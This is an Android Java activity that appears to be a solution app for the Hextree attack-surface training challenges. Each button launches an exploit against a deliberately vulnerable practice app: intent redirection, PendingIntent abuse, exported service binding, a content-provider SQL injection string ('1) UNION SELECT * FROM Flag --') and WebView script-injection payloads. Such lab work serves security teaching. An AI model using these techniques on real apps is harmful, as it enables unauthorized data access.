package com.hextree.getflag;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Hextree extends AppCompatActivity {
    ServerSocket serverSocket;
    private String password = "";
    Bundle bundle = new Bundle();

    private class IncomingHandler extends Handler{
        IncomingHandler(){
            super(Looper.getMainLooper());
        }
        @Override
        public void handleMessage(Message msg) {
            Log.i("Message", Utils.dumpBundle(msg.getData()));
        }
    }
    private final Messenger clientMessenger = new Messenger(new IncomingHandler());
    private final ServiceConnection serviceConnection_26 = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            Messenger messenger = new Messenger(iBinder);
            Message msg = Message.obtain(null, 42);
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };
    private final ServiceConnection serviceConnection_27 = new ServiceConnection() {
        @SuppressLint("HandlerLeak")
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                Messenger messenger = new Messenger(iBinder);
                Message msg = Message.obtain(null, 1);
                msg.replyTo = clientMessenger;

                bundle.putString("echo", "give flag");
                msg.setData(bundle);
                messenger.send(msg);

                Message msg2 = Message.obtain(null, 2);
                msg2.replyTo = new Messenger(new Handler(){
                    public void handleMessage(Message msg) {
                        if (msg.getData().containsKey("password")) {
                            password = msg.getData().getString("password");
                            bundle.putString("password", password);

                            Message msg3 = Message.obtain(null, 3);
                            msg3.replyTo = clientMessenger;
                            msg3.setData(bundle);
                            msg3.obj = bundle;
                            try {
                                messenger.send(msg3);
                            } catch (RemoteException e) {
                                throw new RuntimeException(e);
                            }
                        }
                    }
                });
                msg2.obj = bundle;
                messenger.send(msg2);

            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ((Button) findViewById(R.id.btn_launch_activity_f1)).setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v){
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f2)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f3)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setData(Uri.parse("https://app.hextree.io/map/android"));
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f4)).setOnClickListener(new View.OnClickListener() {
            int counter = 0;
            @Override
            public void onClick(View view) {
                switch (counter){
                    case 0:
                        Intent intent1 = new Intent();
                        intent1.setAction("PREPARE_ACTION");
                        intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                        startActivity(intent1);
                        break;
                    case 1:
                        Intent intent2 = new Intent();
                        intent2.setAction("BUILD_ACTION");
                        intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                        startActivity(intent2);
                        break;
                    case 2:
                        Intent intent3 = new Intent();
                        intent3.setAction("GET_FLAG_ACTION");
                        intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                        startActivity(intent3);
                        break;
                    case 3:
                        Intent intent4 = new Intent();
                        intent4.setAction("INIT_ACTION");
                        intent4.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                        startActivity(intent4);
                        break;
                    default:
                        counter = 0;
                }
                Log.i("Couter", "Count: " + counter);
                counter += 1;
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f5)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent1 = new Intent();
                Intent intent2 = new Intent();
                Intent intent3 = new Intent();
                intent3.putExtra("reason", "back");
                intent2.putExtra("return", 42);
                intent2.putExtra("nextIntent", intent3);
                intent1.putExtra("android.intent.extra.INTENT", intent2);
                intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
                startActivity(intent1);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f6)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent1 = new Intent();
                Intent intent2 = new Intent();
                Intent intent3 = new Intent();
                intent3.putExtra("reason", "next");
                intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent2.putExtra("return", 42);
                intent2.putExtra("nextIntent", intent3);
                intent1.putExtra("android.intent.extra.INTENT", intent2);
                intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
                intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
                startActivity(intent1);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f7)).setOnClickListener(new View.OnClickListener() {
            int counter = 0;
            @Override
            public void onClick(View view) {
//                Intent intent1 = new Intent();
//                intent1.setAction("REOPEN");
//                intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
//                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                intent1.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
//                startActivity(intent1);
                switch (counter){
                    case 0:
                        Intent intent1 = new Intent();
                        intent1.setAction("OPEN");
                        intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent1.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent1);
                        counter = 1;
                        break;
                    case 1:
                        Intent intent2 = new Intent();
                        intent2.setAction("REOPEN");
                        intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                        intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent2);
                        counter = 0;
                        break;
                }
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f8)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
                startActivityForResult(intent, 42);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f9)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity"));
                startActivityForResult(intent, 42);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f12)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.putExtra("LOGIN", true);
                intent.putExtra("token", 1094795585);
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f13)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction("android.intent.action.VIEW");
                intent.addCategory("android.intent.category.BROWSABLE");
                intent.setData(Uri.parse("hex://flag?action=give-me"));
                intent.putExtra("com.android.browser.application_id", "ANYTHING");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f15)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String text = "intent:#Intent;action=io.hextree.action.GIVE_FLAG;S.com.android.browser.application_id=ANY;S.action=flag;B.flag=true;end;";
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("label", text);

                if (clipboard != null) {
                    clipboard.setPrimaryClip(clip);
                }
                Toast.makeText(Hextree.this, "Payload Copied", Toast.LENGTH_SHORT).show();
            }
        });

        // FLAG - 15
        // intent:#Intent;action=io.hextree.action.GIVE_FLAG;S.com.android.browser.application_id=ANY;S.action=flag;B.flag=true;end;
        // Resource - https://developer.chrome.com/docs/android/intents

        ((Button) findViewById(R.id.btn_launch_activity_f16)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent =  new Intent();
                intent.putExtra("flag", "give-flag-16");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
                intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
                sendBroadcast(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f17)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.putExtra("flag", "give-flag-17");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
                sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
                                @Override
                                public void onReceive(Context context, Intent intent) {
                                    String resultData = getResultData();
                                    Bundle resultExtra = getResultExtras(false);
                                    int resultCode = getResultCode();
                                    intent.putExtra("ReceivedFlag", resultExtra.getString("flag"));
                                    Log.i("Bundle", Utils.dumpBundle(resultExtra));
                                    Utils.showDialog(context, intent);
                                }
                            }, null, 0, null, null);
        //        BroadcastReceiver resultReceiver = new BroadcastReceiver() {
        //            @Override
        //            public void onReceive(Context context, Intent intent) {
        //                String resultData = getResultData();
        //                Bundle resultExtra = getResultExtras(false);
        //                int resultCode = getResultCode();
        //                Log.i("Flag", Utils.dumpIntent(Hextree.this, intent));
        //            }
        //        };
        //        sendOrderedBroadcast(intent, null, resultReceiver, null, RESULT_CANCELED, null, null);
//                BroadcastReceiver receiver = new BroadcastReceiverFlag17();
//                registerReceiver(receiver, new IntentFilter());
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f18)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BroadcastReceiver receiver = new BroadcastReceiverFlag18();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
                } else {
                    registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
                }
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f19)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction("APPWIDGET_UPDATE");
                Bundle bundle = new Bundle();
                bundle.putInt("appWidgetMaxHeight", 1094795585);
                bundle.putInt("appWidgetMinHeight", 322376503);
                intent.putExtra("appWidgetOptions", bundle);
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
                sendBroadcast(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f20)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent("io.hextree.broadcast.GET_FLAG");
                intent.putExtra("give-flag", true);
                sendBroadcast(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f20_m2)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BroadcastReceiverFlag20 flag20Receiver = new BroadcastReceiverFlag20();
                IntentFilter intentFilter = new IntentFilter("io.hextree.broadcast.GET_FLAG");
                if (Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(flag20Receiver, intentFilter, Context.RECEIVER_EXPORTED);
                } else {
                    registerReceiver(flag20Receiver, intentFilter);
                }
            }
        });

        // Flag 21 does not checks from where it is receiving intent

//        ((Button) findViewById(R.id.btn_launch_activity_f21)).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                BroadcastReceiverFlag21 flag21Receiver = new BroadcastReceiverFlag21();
//                IntentFilter intentFilter = new IntentFilter("io.hextree.broadcast.GET_FLAG");
//                if (Build.VERSION.SDK_INT >= 33) {
//                    registerReceiver(flag21Receiver, intentFilter, Context.RECEIVER_EXPORTED);
//                } else {
//                    registerReceiver(flag21Receiver, intentFilter);
//                }
//            }
//        });

        ((Button) findViewById(R.id.btn_launch_activity_f22)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
                PendingIntent pendingIntent = PendingIntent.getActivity(Hextree.this, 0, intent, PendingIntent.FLAG_MUTABLE);
                intent.putExtra("PENDING", pendingIntent);
                startActivity(intent);
                Utils.showDialog( Hextree.this, getIntent());
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f24)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE");
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag24Service");
                startService(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f25)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent1 = new Intent("io.hextree.services.UNLOCK1");
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                startService(intent1);

                Intent intent2 = new Intent("io.hextree.services.UNLOCK2");
                intent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                startService(intent2);

                Intent intent3 = new Intent("io.hextree.services.UNLOCK3");
                intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                startService(intent3);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f26)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag26Service");
                bindService(intent, serviceConnection_26, Context.BIND_AUTO_CREATE);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f27)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag27Service");
                bindService(intent, serviceConnection_27, Context.BIND_AUTO_CREATE);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f28)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
                ServiceConnection mConnection = new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
                        IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(iBinder);
                        try {
                            remoteService.openFlag();
                        } catch (RemoteException e) {
                            throw new RuntimeException(e);
                        }
                    }

                    @Override
                    public void onServiceDisconnected(ComponentName componentName) {

                    }
                };
                bindService(intent, mConnection, Context.BIND_AUTO_CREATE);

            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f29)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag29Service");
                ServiceConnection mConnection = new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
                        IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(iBinder);
                        try {
                            String pw = remoteService.init();
                            Log.i("Password-Flag29", pw);
                            remoteService.authenticate(pw);
                            remoteService.success();
                        } catch (RemoteException e) {
                            throw new RuntimeException(e);
                        }
                    }

                    @Override
                    public void onServiceDisconnected(ComponentName componentName) {

                    }
                };
                bindService(intent, mConnection, Context.BIND_AUTO_CREATE);

            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f30)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag30/success"), null, null,   null, null);

                if (cursor!=null && cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        Log.d("FLAG", sb.toString());
                        String regex = "value = (\\S+),"; // This regex captures the value after "value = "
                        Pattern pattern = Pattern.compile(regex);
                        Matcher matcher = pattern.matcher(sb.toString());

                        if (matcher.find()) {
                            String value = matcher.group(1);
                            Toast.makeText(Hextree.this, value, Toast.LENGTH_SHORT).show();
                        }
                    } while (cursor.moveToNext());
                }
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f31)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag31/flag/31"), null, null,   null, null);

                if (cursor!=null && cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        Log.d("FLAG", sb.toString());
                        String regex = "value = (\\S+),"; // This regex captures the value after "value = "
                        Pattern pattern = Pattern.compile(regex);
                        Matcher matcher = pattern.matcher(sb.toString());

                        if (matcher.find()) {
                            String value = matcher.group(1);
                            Toast.makeText(Hextree.this, value, Toast.LENGTH_SHORT).show();
                        }
                    } while (cursor.moveToNext());
                }
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f32)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                TextView flag32_log = findViewById(R.id.flag_log);
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags"), null, "1) UNION SELECT * FROM Flag --",   null, null);
                if (cursor!=null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder();
                    do {
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0 && i != 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        sb.append("\n");
                    } while (cursor.moveToNext());
                    Utils.dumpQuery(Hextree.this, sb.toString());
                }
            }
        });

//                if(flag32_log.getVisibility() == View.INVISIBLE){
//                    flag32_log.setVisibility(View.VISIBLE);
//                    Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags"), null, "1) UNION SELECT * FROM Flag --",   null, null);
//                    if (cursor!=null && cursor.moveToFirst()) {
//                        StringBuilder sb = new StringBuilder();
//                        do {
//                            for (int i = 0; i < cursor.getColumnCount(); i++) {
//                                if (sb.length() > 0 && i != 0) {
//                                    sb.append(", ");
//                                }
//                                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
//                            }
//                            sb.append("\n");
//                        } while (cursor.moveToNext());
//                        flag32_log.setText(sb);
//                    }
//                } else {
//                    flag32_log.setVisibility(View.INVISIBLE);
//                    flag32_log.setText("");
//                }

        ((Button) findViewById(R.id.btn_launch_activity_f33_1)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction("com.hextree.getflag.ActionContentProviderFlag33_1").setClassName(getPackageName(), "com.hextree.getflag.ContentProviderFlag33_1");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f8_hijacking_content_provider_access)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(getPackageName(), "com.hextree.getflag.ContentProviderHijacking"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f34)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName(getPackageName(), "com.hextree.getflag.ContentProviderFlag34");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f35)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName(getPackageName(), "com.hextree.getflag.ContentProviderFlag35");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f36)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName(getPackageName(), "com.hextree.getflag.ContentProviderFlag36");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f37)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setData(Uri.parse("content://com.hextree.flag37"));
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag37Activity"));
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f38)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"));
                intent.putExtra("URL", "data:text/html,<script>hextree.success(true)</script>");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f39)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"));
                intent.putExtra("NAME", "J-yphen </b><button onclick='hextree.success()'>GetTheFlag</button>");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f40)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"));
                Log.d("NativeLibPath", "file://" + getApplicationInfo().nativeLibraryDir+ "/" +"getFlag40.html");
                intent.putExtra("URL", "file://" + getApplicationInfo().nativeLibraryDir+ "/" +"getFlag40.html");
                startActivity(intent);
            }
        });

        ((Button) findViewById(R.id.btn_launch_activity_f41)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        final int PORT = 8081;
                        try {
                            serverSocket = new ServerSocket(PORT);
                            Log.d("Server-status", "Server started at http://localhost:" + PORT);
//                            Toast.makeText(Hextree.this, "Server started at http://localhost:" + PORT, Toast.LENGTH_SHORT).show();

                            while (!serverSocket.isClosed()) {
                                Socket clientSocket = serverSocket.accept(); // Wait for a connection
                                try {
                                    // Read the incoming request
                                    BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                                    String requestLine = reader.readLine();
                                    Log.d("http-req", requestLine);
                                    OutputStream outputStream = clientSocket.getOutputStream();

                                    if (requestLine != null && requestLine.startsWith("GET") && !requestLine.contains("favicon.ico")) {
                                        String responseContent = getFileContent();

                                        // Send the HTTP response
                                        String responseHeaders = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n";
                                        outputStream.write(responseHeaders.getBytes());
                                        outputStream.write(responseContent.getBytes());
                                        outputStream.flush();
                                    }

                                    clientSocket.close();
                                } catch (IOException e) {
                                    Log.d("Error", e.toString());
                                }
                            }
                        } catch (IOException e) {
                            Log.d("Server-status", "Error starting the server: " + e.toString());
//                            Toast.makeText(Hextree.this, "Error starting the server", Toast.LENGTH_SHORT).show();
                        }
                    }
                }).start();

                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity"));
                intent.putExtra("URL", "http://localhost:8081");
                startActivity(intent);
            }
        });

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            if (serverSocket != null) {
                serverSocket.close(); // Close the server socket when the activity is destroyed
            }
        } catch (IOException e) {
            Log.d("error", e.toString());
        }
    }

    private String getFileContent() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            InputStream inputStream = getAssets().open("flag41.html"); // Access assets using context
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append('\n');
            }
            bufferedReader.close();
        } catch (IOException e) {
            Log.e("getFileContent", "Error reading asset file: " + "flag41.html", e);
            return "Error loading content."; // Handle the error appropriately
        }
        return stringBuilder.toString();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        Utils.showDialog(Hextree.this, intent);
    }
}